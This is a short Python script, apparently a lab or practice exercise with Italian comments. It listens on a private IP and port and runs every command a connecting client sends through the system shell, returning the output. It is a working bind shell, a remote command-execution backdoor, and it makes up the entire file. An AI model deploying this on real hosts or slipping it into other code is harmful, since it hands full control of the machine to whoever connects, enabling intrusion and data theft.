import socket
import subprocess
from ctypes.wintypes import INT

HOST = '192.168.66.112'  # Indirizzo IP del server
PORT = 7777  # Porta su cui il server ascolta

#Crea un socket TCP/IP
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Associa il socket all'indirizzo e alla porta
server_socket.bind((HOST, PORT))

#Inizia l'ascolto delle connessioni in entrata
server_socket.listen(1)

print('Server in ascolto su {}:{}'.format(HOST, PORT))

#Accetta la connessione dal client
client_socket, client_address = server_socket.accept()

print('Connessione accettata da:', client_address)

#Ricevi dati dal client
data = client_socket.recv(1024)
print('Dati ricevuti:', data.decode())

#Invia una risposta al client
response = 'Ciao client!'
client_socket.sendall(response.encode())

# Sending and receiving commands in an infinite loop
while True:
    print("[-] Awaiting commands...")
    command = client_socket.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client_socket.send(output + output_error)
client_socket.close()
server_socket.close()

